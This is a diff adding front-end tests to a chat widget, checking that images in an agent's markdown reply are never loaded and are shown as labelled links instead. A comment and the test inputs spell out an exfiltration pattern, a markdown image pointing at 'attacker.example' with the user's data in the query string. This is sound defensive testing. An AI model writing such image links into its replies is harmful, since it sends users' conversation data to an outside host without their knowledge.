@@ -103,6 +103,57 @@ async function answer(markdown: string): Promise<HTMLAnchorElement[]> {
   return [...document.querySelectorAll<HTMLAnchorElement>('.aui-md a')];
 }
 
+/** Answer once with `markdown` and wait for the rendered reply, link or not. */
+async function reply(markdown: string): Promise<HTMLElement> {
+  const t2v = new Talk2View({ partnerKey: 'pk_test_x', anonymousAutoStart: false });
+  const events: ChatEvent[] = [{ type: 'text', content: markdown }, { type: 'done', threadId: 'th' }];
+  vi.spyOn(t2v, 'chat' as never).mockImplementation((() =>
+    (async function* () {
+      for (const e of events) yield e;
+    })()) as never);
+
+  render(<Talk2ViewChat client={t2v} />);
+  await screen.findByRole('heading', { name: /how can i help/i });
+  await act(async () => {
+    await t2v.sendMessage('cite something').catch(() => {});
+  });
+  await waitFor(() => expect(document.querySelector('.aui-md')).toBeTruthy());
+  return document.querySelector('.aui-md') as HTMLElement;
+}
+
+describe('an image the agent wrote', () => {
+  /**
+   * ADR 0009: a reply is untrusted, and nothing in it may fetch on its own.
+   * An image is the sharpest case, because the model chooses both the host and
+   * the query string: `![](https://attacker.example/x.png?d=<the user's data>)`
+   * renders, the browser GETs it, and the conversation has left the building
+   * with nobody clicking anything. `/ui` has refused images since that ADR;
+   * the packaged chat is the recommended surface now and has to refuse them too.
+   */
+  it('never loads it — the reply cannot make the browser fetch', async () => {
+    const rendered = await reply('![a diagram](https://attacker.example/x.png?d=leak)');
+    expect(rendered.querySelectorAll('img')).toHaveLength(0);
+  });
+
+  it('shows it as a link the end-user may choose to open, naming the host', async () => {
+    const rendered = await reply('![a diagram](https://attacker.example/x.png?d=leak)');
+    const links = [...rendered.querySelectorAll<HTMLAnchorElement>('a')];
+    const image = links.find((a) => a.textContent?.startsWith('Image'));
+    expect(image).toBeTruthy();
+    expect(image!.textContent).toBe('Image: a diagram (attacker.example)');
+    expect(image!.getAttribute('href')).toBe('https://attacker.example/x.png?d=leak');
+    expect(image!.getAttribute('target')).toBe('_blank');
+    expect(image!.getAttribute('rel')).toBe('noopener noreferrer');
+  });
+
+  it('keeps the label but drops the destination for a scheme that is not the web', async () => {
+    const rendered = await reply('![x](data:image/svg+xml;base64,PHN2Zz48L3N2Zz4=)');
+    expect(rendered.querySelectorAll('img')).toHaveLength(0);
+    expect(rendered.textContent).toContain('Image: x');
+    expect(rendered.querySelectorAll('a')).toHaveLength(0);
+  });
+});
+
 describe('a link the agent wrote', () => {
   it('opens beside the host app, never in its tab', async () => {
     const [link] = await answer('See [the paper](https://example.org/paper) for the method.');
